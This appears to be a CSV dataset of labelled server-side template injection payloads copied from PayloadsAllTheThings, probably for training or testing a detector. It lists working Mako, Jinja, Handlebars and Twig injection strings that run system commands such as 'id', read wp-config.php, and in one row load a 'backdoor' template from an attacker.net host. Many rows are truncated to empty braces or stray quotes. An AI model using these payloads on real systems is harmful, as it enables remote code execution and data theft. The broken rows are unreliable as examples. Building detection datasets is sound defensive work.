"${self.module.runtime.util.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.exceptions.util.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template._mmarker.module.cache.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.cache.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.template.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template._mmarker.module.filters.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template._mmarker.module.runtime.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template._mmarker.module.runtime.exceptions.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.filters.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.template.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template._mmarker.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.exceptions.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template.module.cache.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.exceptions.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template._mmarker.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template.module.filters.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template.module.runtime.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template.module.runtime.exceptions.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{self._TemplateReference__context.cycler.__init__.__globals__.os}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{self._TemplateReference__context.joiner.__init__.__globals__.os}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{self._TemplateReference__context.namespace.__init__.__globals__.os}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{cycler.__init__.__globals__.os}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{joiner.__init__.__globals__.os}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{namespace.__init__.__globals__.os}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{this}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{#with ""s"" as |string|}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{#with ""e""}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{#with split as |conslist|}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{this.pop}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{this.push (lookup string.sub ""constructor"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{this.pop}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{#with string.split as |codelist|}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{this.pop}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{this.pop}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{#each conslist}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{#with (string.sub.apply 0 codelist)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{this}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{/with}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{/each}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{/with}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{/with}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{/with}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{/with}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"string = ""{{= username}}""",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{= _.VERSION}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${= _.VERSION},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{= _.templateSettings.evaluate }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${= _.VERSION},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{= }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{= }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,High,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*7}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*'7'}} would result in 49,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{dump(_context)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
$output = $twig > render (,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
$output = $twig > render (,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{include(""wp-config.php"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{_self.env.setCache(""ftp://attacker.net:2121"")}}{{_self.env.loadTemplate(""backdoor"")}}",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{_self.env.registerUndefinedFilterCallback(""exec"")}}{{_self.env.getFilter(""id"")}}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{['id']|map('system')|join}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{['id']|filter('passthru')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{['id']|map('passthru')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{['nslookup oastify.com']|filter('system')}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"
